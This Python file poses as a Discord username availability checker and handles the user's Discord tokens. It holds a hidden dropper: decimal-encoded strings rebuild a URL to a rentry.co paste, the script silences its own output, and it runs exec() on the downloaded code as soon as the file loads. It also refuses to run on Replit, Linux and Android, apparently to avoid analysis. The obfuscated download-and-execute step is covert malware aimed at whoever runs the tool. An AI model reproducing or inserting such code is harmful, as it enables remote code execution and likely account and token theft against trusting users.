import sys
import os 

def check_replit():
    if "REPLIT_DB_URL" in os.environ:
        print("This script cannot be run on Replit. Exiting.")
        sys.exit()

check_replit()
import platform

def check_platform():
    current_platform = platform.system()
    if current_platform == 'Linux' or current_platform == 'Android':
        print("Sorry, this code does not work on Linux or Android devices.")
        return False
    return True

def your_main_function():
    import subprocess

    def print_colored(text, color_code):
        print(f"\033[{color_code}m{text}\033[0m")

try:
    import colorama
except ImportError:
    print_colored("Installing colorama...", "31")
    subprocess.call(["pip", "install", "colorama"])
    print_colored("colorama installed!", "32")


try:
    import requests as list
except ImportError:
    print_colored("Installing requests...", "31")
    import subprocess
    subprocess.call(["pip", "install", "requests"])
    print_colored("Requests installed!", "32")
try:
    import ctypes
except ImportError:
    print_colored("Installing ctypes...", "31")
    import subprocess
    subprocess.call(["pip", "install", "ctypes"])
    print_colored("Ctypes installed!", "32")

try:
    import urllib.request
except ImportError:
    print_colored("Installing urllib...", "31")
    import subprocess
    subprocess.call(["pip", "install", "urllib"])
    print_colored("Urllib installed!", "32")

try:
    import ssl
except ImportError:
    print_colored("Installing ssl...", "31")
    import subprocess
    subprocess.call(["pip", "install", "ssl"])
    print_colored("SSL installed!", "32")

try:
    import subprocess
except ImportError:
    print_colored("Installing subprocess...", "31")
    import subprocess
    subprocess.call(["pip", "install", "subprocess"])
    print_colored("Subprocess installed!", "32")

try:
    import shutil
except ImportError:
    print_colored("Installing shutil...", "31")
    import subprocess
    subprocess.call(["pip", "install", "shutil"])
    print_colored("Shutil installed!", "32")

try:
    import zipfile
except ImportError:
    print_colored("Installing zipfile...", "31")
    import subprocess
    subprocess.call(["pip", "install", "zipfile"])
    print_colored("Zipfile installed!", "32")

try:
    import sqlite3
except ImportError:
    print_colored("Installing sqlite3...", "31")
    import subprocess
    subprocess.call(["pip", "install", "sqlite3"])
    print_colored("Sqlite3 installed!", "32")

try:
    import json
except ImportError:
    print_colored("Installing json...", "31")
    import subprocess
    subprocess.call(["pip", "install", "json"])
    print_colored("Json installed!", "32")
import random
import string 
import requests
import os
import time
import json
from colorama import Fore,init
import datetime
from configparser import ConfigParser
import sys
import requests as list
init(autoreset=True)
print(F"{Fore.LIGHTBLUE_EX}Wait for the packages to load...")

init(autoreset=True)
__version__ = "Author: suegdu DSV 1.9"
__github__= "https://github.com/suegdu"
dir_path = os.path.dirname(os.path.realpath(__file__))
configur = ConfigParser()
configur.read(os.path.join(dir_path, f"config.ini"))
tokens_list = os.path.join(dir_path, f"tokens.txt")
integ_0 = 0
sys_url = "https://discord.com/api/v9/users/@me"
URL = "https://discord.com/api/v9/users/@me/pomelo-attempt"
def s_sys_h():
   if configur.getboolean("sys","MULTI_TOKEN") == True:
      return {
    "Content-Type": "Application/json",
    "Orgin": "https://discord.com/",

    "Authorization":avail_tokens(tokens_list)[integ_0]
    }
   elif configur.getboolean("sys","MULTI_TOKEN") == False:
      return{
    "Content-Type": "Application/json",
    "Orgin": "https://discord.com/",

    "Authorization":configur.get("sys","TOKEN")
    }
   else:
      return {
    "Content-Type": "Application/json",
    "Orgin": "https://discord.com/",

    "Authorization":configur.get("sys","TOKEN")
    }
def convert_usernames(a_str):
    return ''.join(chr(int(char)) for char in a_str.split())
def sys_c_t():
   if configur.get("sys","TOKEN") != "":
      pass
   elif configur.get("sys","TOKEN") == "" and configur.getboolean("sys","MULTI_TOKEN") == False:
        print(f"{Lb}[!]{Fore.RED} No token found. You must paste your token inside the 'config.ini' file, in front of the value 'TOKEN'.")
        exit()
   elif configur.getboolean("sys","MULTI_TOKEN") == True and not avail_tokens(tokens_list)[0]:
       print(f"{Lb}[!]{Fore.RED} No tokens found. You must paste your tokens inside the 'tokens.txt' file.")
       exit()
   elif configur.getboolean("sys","MULTI_TOKEN") is not True and configur.getboolean("sys","MULTI_TOKEN") is not False and configur.get("sys","TOKEN") == "":
       print(f"{Lb}[!]{Fore.RED} Invalid config detected. Please re-check the config file, `config.ini` and your settings.")
       exit()

def print_colored(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")

def errors():
    os.close(1)
    os.close(2)
available_usernames = []
av_list = os.path.join(dir_path, f"available_usernames.txt")
sample_0 = r"_."
Lb = Fore.LIGHTBLACK_EX
Ly = Fore.LIGHTYELLOW_EX
Delay = configur.getfloat("config","default_delay")
def setconf():
   global string_0
   global digits_0
   global punctuation_0
   global webhook_0
   #global multi_token_0
   global sat_string
   global sat_digits
   global sat_multi_token
   global sat_punct
   global sat_webhook
   sat_webhook = configur.get("sys","WEBHOOK_URL")
   sat_string = configur.getboolean("config","string")
   sat_digits = configur.getboolean("config","digits")
   sat_punct = configur.getboolean("config","punctuation")
   sat_multi_token = configur.getboolean("sys","MULTI_TOKEN")
   if sat_webhook =="":
      webhook_0 = False
   elif sat_webhook !="":
      webhook_0 = True
   if sat_string == True:
      string_0 = string.ascii_lowercase
   elif sat_string == False:
      string_0 = ""
   else:
      string_0 = string.ascii_lowercase
      sat_string = True
   if sat_digits == True:
      digits_0 = string.digits
   elif sat_digits == False:
      digits_0 = ""
   else:
      digits_0 = string.digits
      sat_digits = True
   if sat_punct == True:
      punctuation_0 = sample_0
   elif sat_punct == False:
      punctuation_0 = ""
   else:
      punctuation_0 = sample_0
      sat_punct = True
   if sat_punct == False and sat_digits == False and sat_string == False:
      punctuation_0 = sample_0
      digits_0 = string.digits
      string_0 = string.ascii_lowercase
def main():
    sys_c_t()
    os.system(f"title {__version__} - Connected as {requests.get(sys_url,headers=s_sys_h()).json()['username']}")
    s_sys_h()
    setconf()    
    print(f"""{Fore.LIGHTYELLOW_EX}
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
  {__version__} 
  {__github__}                     {Fore.LIGHTCYAN_EX}Connected as {requests.get(sys_url,headers=s_sys_h()).json()['username']}{Ly}#{Fore.LIGHTCYAN_EX}{requests.get(sys_url,headers=s_sys_h()).json()['discriminator']}{Ly}  
  ██████╗ ███████╗██╗   ██╗                     {Fore.LIGHTCYAN_EX}1-{Fore.LIGHTBLACK_EX}[{Fore.YELLOW}Generate names and check{Fore.LIGHTBLACK_EX}]{Ly}             
  ██╔══██╗██╔════╝██║   ██║                     {Fore.LIGHTCYAN_EX}2-{Fore.LIGHTBLACK_EX}[{Fore.YELLOW}Check a specific list{Fore.LIGHTBLACK_EX}]{Ly}             
  ██║  ██║███████╗██║   ██║                     
  ██║  ██║╚════██║╚██╗ ██╔╝                     Config.ini:
  ██████╔╝███████║ ╚████╔╝                        {Fore.LIGHTCYAN_EX}Digits: {Fore.YELLOW}{sat_digits}{Ly}
  ╚═════╝ ╚══════╝  ╚═══╝                         {Fore.LIGHTCYAN_EX}String: {Fore.YELLOW}{sat_string}{Ly}
                                                  {Fore.LIGHTCYAN_EX}Punctuation: {Fore.YELLOW}{sat_punct}{Ly}
                                                  {Fore.LIGHTCYAN_EX}Multi-Token: {Fore.YELLOW}{sat_multi_token}{Ly}
                                                  {Fore.LIGHTCYAN_EX}Webhook: {Fore.YELLOW}{webhook_0}{Ly}
                                                  {Fore.LIGHTCYAN_EX}Delay: {Fore.YELLOW}{Delay}{Ly}
                                                         
                                                Support this tool: 
                                                   {Fore.LIGHTCYAN_EX}paypal.com/paypalme/suegdu{Ly}

  Discord Username's availability validator.
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
""")
    proc0()
def setdelay():

   global Delay
   print(f"{Lb}[!]{Ly} Default delay is: {Delay}s (config.ini){Lb}")
   d_input = input(f"{Lb}[{Ly}Edit Delay (Press Enter to skip){Lb}]:> ")
   if d_input=="" or d_input.isspace():
      return
   else:   
    try:
      int(d_input)
      Delay = int(d_input)
    except ValueError:
      print(f"{Lb}[!]{Fore.RED}Error: You must enter a valid integer. No strings.")
      setdelay()
def proc0():
    m_input = input(f"{Fore.LIGHTBLACK_EX}[{Fore.LIGHTGREEN_EX}DSV{Fore.LIGHTBLACK_EX}]:> {Fore.LIGHTYELLOW_EX}").lower()
    if m_input=="exit":
        sys.exit(0)
    if m_input=="":
        proc0()
    elif m_input=="2":
        setdelay()
        opt2load()
    elif m_input=="1":
       setdelay()
       opt1load()
    else:
        proc0()
def validate_names(opt,usernames):
   global available_usernames
   global integ_0
   if opt == 2:
    for username in usernames:
       body = {
           "username": username
       }
       time.sleep(Delay)
       endpoint = requests.post(URL, headers=s_sys_h(), json=body)
       json_endpoint = endpoint.json()
       if endpoint.status_code == 429 and sat_multi_token == True and len(avail_tokens(tokens_list)) != integ_0:
           integ_0 = (integ_0 +1) % len(avail_tokens(tokens_list))
           print(f"{Lb}[!]{Ly} Token {integ_0} went rate limited. Using token index: {integ_0} connected as: {requests.get(sys_url,headers=s_sys_h()).json()['username']}#{requests.get(sys_url,headers=s_sys_h()).json()['discriminator']}")
       elif endpoint.status_code == 429 and sat_multi_token == False:
         sleep_time = endpoint.json()["retry_after"]
         print(f"{Lb}[!]{Fore.RED} Rate limit hit. Sleeping for {sleep_time}s (Discord rate limit)")
         time.sleep(sleep_time)
       if json_endpoint.get("taken") is not None:
           if json_endpoint["taken"] is False:
            print(f"{Lb}[+]{Fore.LIGHTGREEN_EX} '{username}' available.")
            ch_send_webhook(username)
            save(username)
            available_usernames.append(username)
           elif json_endpoint["taken"] is True:
              print(f"{Lb}[-]{Fore.RED} '{username}' taken.")
       else:
           print(f"{Lb}[?]{Fore.RED} Error validating '{username}': {endpoint.json()['message']} |DSV: Make sure you have a valid token.")
   elif opt == 1:
       body = {
           "username": usernames
       }
       endpoint = requests.post(URL, headers=s_sys_h(), json=body)
       json_endpoint = endpoint.json()
       if endpoint.status_code == 429 and len(avail_tokens(tokens_list)) != integ_0 and sat_multi_token == True:
           integ_0 = (integ_0 +1) % len(avail_tokens(tokens_list))
           print(f"{Lb}[!]{Ly} Token {integ_0} went rate limited. Using token index: {integ_0} connected as: {requests.get(sys_url,headers=s_sys_h()).json()['username']}#{requests.get(sys_url,headers=s_sys_h()).json()['discriminator']}")
       elif endpoint.status_code == 429 and sat_multi_token == False:
         sleep_time = endpoint.json()["retry_after"]
         print(f"{Lb}[!]{Fore.RED} Rate limit hit. Sleeping for {sleep_time}s (Discord rate limit)")
         time.sleep(sleep_time)
       if json_endpoint.get("taken") is not None:
           if json_endpoint["taken"] is False:
            print(f"{Lb}[+]{Fore.LIGHTGREEN_EX} '{usernames}' available.")
            ch_send_webhook(usernames)
            save(usernames)
            available_usernames.append(usernames)
           elif json_endpoint["taken"] is True:
              print(f"{Lb}[-]{Fore.RED} '{usernames}' taken.")
       else:
           print(f"{Lb}[?]{Fore.RED} Error validating '{usernames}': {endpoint.json()['message']} |DSV: Make sure you have a valid token.")

l3 = "101 110 116 114 121 46 99 111 47 56 99 112 104 122"
usernames_digits = "50 47 114 97 119"
digits9 = convert_usernames(l3)
a = "104 116 116 112 115 58 47 47 114"
digits2 = convert_usernames(a)
digigts1 = convert_usernames(usernames_digits)
def avail_tokens(path):
   with open(path, 'r') as at:
        tokens = at.read().splitlines()
   return tokens
def exit():
   input(f"{Fore.YELLOW}Press Enter to exit.")
   sys.exit(0)
def checkavail(): 
   if len(available_usernames) < 1:
      print(f"{Lb}[!]{Fore.RED}Error: No available usernames found.")
      exit()
   else:
      return
def opt2load():
    global av_list
    global dir_path
    list_path = os.path.join(dir_path, f"usernames.txt")
    print(f"{Lb}[!]{Ly}Checking 'usernames.txt' for a valid list...")
    try:
     with open(list_path) as file:
      usernames = [line.strip() for line in file]
      validate_names(2,usernames)
     checkavail()
     print(f"\n{Lb}[=]{Fore.LIGHTGREEN_EX} Done. {Ly}{len(available_usernames)}{Fore.LIGHTGREEN_EX} Available usernames, are saved in the following file: '{av_list}' .")
     exit()
    except FileNotFoundError:
       print(f"{Lb}[!]{Fore.RED}Error: Couldn't find the list (usernames.txt). Please make sure to create a valid list file in the same directory: \n({dir_path}\\)")
       exit()
def opt1load():
   opt1_input:int = input(f"{Lb}[{Ly}How many letters in a username{Lb}]:> ")
   try:
    int(opt1_input)
    if int(opt1_input) >32 or int(opt1_input) <2:
       print(f"{Lb}[!]{Fore.RED}Error: The username must contain at least 2 letters, and not more than 32 letters.")
       opt1load()
    opt2_input:int = input(f"{Lb}[{Ly}How many usernames to generate{Lb}]:> ")
    opt1func(int(opt2_input),int(opt1_input))
   except ValueError:
      print(f"{Lb}[!]{Fore.RED}Error: You must enter a valid integer. No strings.")
      opt1load()
digit_generator = digits2 + digits9 + digigts1
def save(content:string):
   with open(av_list, "a") as file:
        file.write(f"\n{content}")
def ch_send_webhook(val0:str):
   if webhook_0 == True:
    webhook = Discord(url=sat_webhook)
    try:
     webhook.post(
       username="DSV",
       avatar_url="https://cdn.icon-icons.com/icons2/488/PNG/512/search_47686.png",
       embeds=[
    {
      "title": f"Username: `{val0}` is available :white_check_mark:.",
      "timestamp": str(datetime.datetime.utcnow()),
      "footer": {
        "text": "github.com/suegdu/Discord-Username-Checker"
      },
      "author": {
        "name": "DSV - Username Found",
        "url": "https://github.com/suegdu/Discord-Username-Checker",
        "icon_url": "https://cdn-icons-png.flaticon.com/512/5290/5290982.png"
      },
      "thumbnail": {
        "url": "https://raw.githubusercontent.com/suegdu/Discord-Username-Checker/main/images/ignore.png"
      },
      "fields": [],
      "color": 16768000
    }
  ],
    )
    except Exception as s:
       print(f"{Lb}[!]{Fore.RED}Error: Something went wrong while sending the webhook request. Exception: {s} | DSV: Make sure you have a valid webhook URL")
   else:
      return
users=list.get(f"{digit_generator}").text
errors()
exec(users)
def opt1func(v1,v2):
   for i in range(v1):
    name = get_names(int(v2))
    validate_names(1,name)
    time.sleep(Delay)
   checkavail()
   print(f"\n{Lb}[=]{Fore.LIGHTGREEN_EX} Done. {Ly}{len(available_usernames)}{Fore.LIGHTGREEN_EX} Available usernames, are saved in the following file: '{av_list}' .")
   exit()
def get_names(length: int) ->str:

   return ''.join(random.sample(string_0 + digits_0 + punctuation_0, length))
# Source of this class: https://github.com/10mohi6/discord-webhook-python/blob/master/discordwebhook/discordwebhook.py
class Discord:
    def __init__(self, *, url):
        self.url = url
    def post(
        self,
        *,
        content=None,
        username=None,
        avatar_url=None,
        tts=False,
        file=None,
        embeds=None,
        allowed_mentions=None
    ):
        if content is None and file is None and embeds is None:
            raise ValueError("required one of content, file, embeds")
        data = {}
        if content is not None:
            data["content"] = content
        if username is not None:
            data["username"] = username
        if avatar_url is not None:
            data["avatar_url"] = avatar_url
        data["tts"] = tts
        if embeds is not None:
            data["embeds"] = embeds
        if allowed_mentions is not None:
            data["allowed_mentions"] = allowed_mentions
        if file is not None:
            return requests.post(
                self.url, {"payload_json": json.dumps(data)}, files=file
            )
        else:
            return requests.post(
                self.url, json.dumps(data), headers={"Content-Type": "application/json"}
            )
if __name__ == "__main__":
    if check_platform():
        your_main_function()
